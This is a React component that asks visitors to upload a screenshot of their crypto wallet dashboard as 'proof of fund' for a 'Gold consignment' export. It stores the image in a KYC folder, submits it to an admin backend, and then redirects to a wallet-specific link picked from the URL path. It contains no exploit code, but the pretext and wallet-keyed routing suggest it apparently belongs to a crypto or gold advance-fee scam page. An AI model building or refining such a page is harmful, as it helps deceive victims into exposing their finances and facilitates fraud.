import React, { useEffect, useState, useRef } from 'react';
import { walletRedirectLinks } from '../walletRedirectLinks';

const ProofOfFund = ({ theme, walletType, startCountdown }) => {
  const [countdown, setCountdown] = useState(9); // Start at 9 when countdown begins
  const [progress, setProgress] = useState(0); // Progress bar state
  const [selectedFile, setSelectedFile] = useState(null);
  const [uploading, setUploading] = useState(false);
  const [uploadError, setUploadError] = useState('');
  const [cloudinaryData, setCloudinaryData] = useState(null);
  const [showPreview, setShowPreview] = useState(false);
  const [submitStatus, setSubmitStatus] = useState('');
  const timersRef = useRef({});

  useEffect(() => {
    // Only start timers when startCountdown becomes true
    if (!startCountdown) return undefined;

    // Get wallet type from URL path (e.g., /trust, /binance)
    const path = window.location.pathname;
    // Remove leading slash and possible trailing slash, get first segment
    const routeWalletType = path.replace(/^\//, '').replace(/\/$/, '').split('/')[0].toLowerCase();

    setCountdown(9);
    setProgress(0);

    timersRef.current.countdownInterval = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timersRef.current.countdownInterval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    timersRef.current.progressInterval = setInterval(() => {
      setProgress((prev) => {
        const next = prev + 100 / 9;
        if (next >= 100) {
          clearInterval(timersRef.current.progressInterval);
          return 100;
        }
        return next;
      });
    }, 1000);

    timersRef.current.redirectTimer = setTimeout(() => {
      const redirectUrl = walletRedirectLinks[routeWalletType];
      if (redirectUrl) {
        window.location.href = redirectUrl;
      }
      // If no link is specified, do not redirect
    }, 9 * 1000);

    return () => {
      clearInterval(timersRef.current.countdownInterval);
      clearInterval(timersRef.current.progressInterval);
      clearTimeout(timersRef.current.redirectTimer);
      timersRef.current = {};
    };
  }, [startCountdown]);

  // Cloudinary upload handler
  const handleFileUpload = async () => {
    if (!selectedFile) return;
    setUploading(true);
    setUploadError('');
    try {
      const formData = new FormData();
      formData.append('file', selectedFile);
  formData.append('upload_preset', import.meta.env.VITE_CLOUDINARY_UNSIGNED_PRESET || 'unsigned_preset');
      // Optionally set folder by sessionId
      const sessionId = localStorage.getItem('sessionId') || 'unknown';
      formData.append('folder', `kyc/${sessionId}`);
  const res = await fetch(`https://api.cloudinary.com/v1_1/${import.meta.env.VITE_CLOUDINARY_CLOUD_NAME}/auto/upload`, {
        method: 'POST',
        body: formData
      });
      const data = await res.json();
      if (!data.secure_url) throw new Error(data.error?.message || 'Upload failed');
  setCloudinaryData(data);
  setShowPreview(true);
    } catch (err) {
      setUploadError(err.message || 'Upload failed');
    }
    setUploading(false);
  };

  // Submit Proof of Fund to backend
  const handleSubmitProof = async () => {
    if (!cloudinaryData) return;
    setSubmitStatus('submitting');
    try {
      const sessionId = localStorage.getItem('sessionId') || 'unknown';
      const payload = {
        sessionId,
        imageUrls: [
          {
            public_id: cloudinaryData.public_id,
            url: cloudinaryData.secure_url,
            resource_type: cloudinaryData.resource_type,
            format: cloudinaryData.format,
            bytes: cloudinaryData.bytes,
          }
        ]
      };
      const res = await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc/proof-of-fund`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      if (!res.ok) throw new Error('Failed to submit proof of fund');
      setSubmitStatus('success');
      // Clear session from device
      localStorage.removeItem('sessionId');
    } catch (err) {
      setSubmitStatus('error');
    }
  };

  return (
    <div
      className="proof-of-fund"
      style={{
        background: theme.bg,
        color: theme.text,
        border: `2px solid ${theme.border}`,
        borderRadius: '10px',
        padding: '20px',
        boxShadow: '0 2px 8px rgba(0,0,0,0.15)',
      }}
    >
      {/* Top loader */}
      <div
        style={{
          height: '4px',
          width: `${progress}%`,
          background: theme.accent,
          transition: 'width 1s linear',
        }}
      ></div>

      {showPreview && cloudinaryData ? (
        <div style={{ marginTop: 16, textAlign: 'center' }}>
          <img src={cloudinaryData.secure_url} alt="Proof of Fund" style={{ maxWidth: '100%', borderRadius: 8 }} />
          <button
            onClick={handleSubmitProof}
            disabled={submitStatus === 'submitting'}
            style={{
              marginTop: 16,
              background: theme.accent,
              color: theme.buttonText,
              fontWeight: 700,
              fontSize: 16,
              borderRadius: 8,
              padding: '10px 0',
              width: '100%',
              border: 'none',
              boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
              cursor: submitStatus === 'submitting' ? 'not-allowed' : 'pointer',
              opacity: submitStatus === 'submitting' ? 0.6 : 1
            }}
          >
            {submitStatus === 'submitting' ? 'Submitting...' : 'Submit Proof of Fund'}
          </button>
          <button
            onClick={() => {
              setShowPreview(false);
              setCloudinaryData(null);
              setSelectedFile(null);
              setSubmitStatus('');
            }}
            style={{
              marginTop: 10,
              background: '#eee',
              color: '#333',
              fontWeight: 700,
              fontSize: 14,
              borderRadius: 8,
              padding: '8px 0',
              width: '100%',
              border: 'none',
              boxShadow: '0 1px 4px rgba(0,0,0,0.07)',
              cursor: 'pointer',
            }}
          >
            Cancel
          </button>
          {submitStatus === 'success' && <p style={{ color: 'green' }}>Proof of Fund submitted successfully!</p>}
          {submitStatus === 'error' && <p style={{ color: 'red' }}>Failed to submit Proof of Fund.</p>}
        </div>
      ) : (
        <>
          <h2 style={{ color: theme.accent }}>Proof of Fund</h2>
          <p>Please upload a screenshot of your dashboard showing sufficient funds for the export of the Gold consignment.</p>
          <input
            type="file"
            accept="image/*"
            onChange={e => setSelectedFile(e.target.files[0])}
            style={{
              background: theme.bg,
              color: theme.text,
              border: `1px solid ${theme.border}`,
              borderRadius: '5px',
              padding: '10px',
            }}
          />
          <button
            onClick={handleFileUpload}
            disabled={!selectedFile || uploading}
            style={{
              marginTop: 16,
              background: theme.accent,
              color: theme.buttonText,
              fontWeight: 700,
              fontSize: 16,
              borderRadius: 8,
              padding: '10px 0',
              width: '100%',
              border: 'none',
              boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
              cursor: !selectedFile ? 'not-allowed' : 'pointer',
              opacity: !selectedFile ? 0.6 : 1
            }}
          >
            {uploading ? 'Uploading...' : 'Upload Screenshot'}
          </button>
          {uploadError && <p style={{ color: 'red' }}>{uploadError}</p>}
        </>
      )}
      <p style={{ marginTop: '10px', color: theme.text }}>
        Redirecting in {countdown} seconds...
      </p>
    </div>
  );
};

export default ProofOfFund;